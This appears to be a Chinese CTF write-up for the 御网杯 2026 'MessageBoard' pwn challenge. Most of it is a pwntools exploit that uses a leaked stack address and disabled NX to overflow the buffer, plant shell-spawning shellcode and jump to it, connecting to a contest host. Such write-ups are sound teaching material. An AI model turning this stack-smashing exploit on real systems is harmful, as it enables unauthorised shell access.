---
title: "御网杯 PWN MessageBoard"
published: 2026-05-30T16:23:50+08:00
description: "已知栈上 buf 地址且无 NX，直接注入 shellcode 并跳回 buf 执行。"
image: ""
tags: ["御网杯PWN2026", "Pwn", "Shellcode", "Stack Overflow"]
category: "《御网杯PWN2026》"
categoryPath: ["《御网杯PWN2026》"]
series: "御网杯PWN2026"
draft: false
lang: "zh_CN"
---

附件：[`PWN-MessageBoard.docx`](/attachments/《御网杯PWN2026》/PWN-MessageBoard.docx)

题目附件截图：

![截图 1](/attachments/《御网杯PWN2026》/pwn-messageboard/01.png)

题解记录：

已知 `buf` 的地址，而且没有 `NX` 保护，可以直接往栈上写入 `shellcode`，然后把返回地址改成 `buf`，跳转到栈顶执行。

原始 WP 中给出的 exp：

```python
from pathlib import Path
from pwn import *

context(os="linux", terminal=["cmd.exe", "/c", "start"])

binary_path = str(Path(__file__).resolve().with_name("pwn"))
host = "47.99.147.34"  # 网址
port = 20056  # 端口

elf = ELF(binary_path, checksec=False)
context.binary = elf

if elf.bits == 64:
    context.arch = "amd64"
    gdbscript = """
    b *main
    c
    """
else:
    context.arch = "i386"
    gdbscript = """
    b *main
    c
    """

context.log_level = "debug"

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)


def p():
    pause()


io.recvuntil(b"Buffer at: ")
buf = int(io.recvline().strip(), 16)
log.info(f"buffer = {hex(buf)}")

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x80 + 0x8, b"A") + p64(buf)
io.send(payload)

io.interactive()
```

后续截图：

![截图 2](/attachments/《御网杯PWN2026》/pwn-messageboard/02.png)

![截图 3](/attachments/《御网杯PWN2026》/pwn-messageboard/03.png)
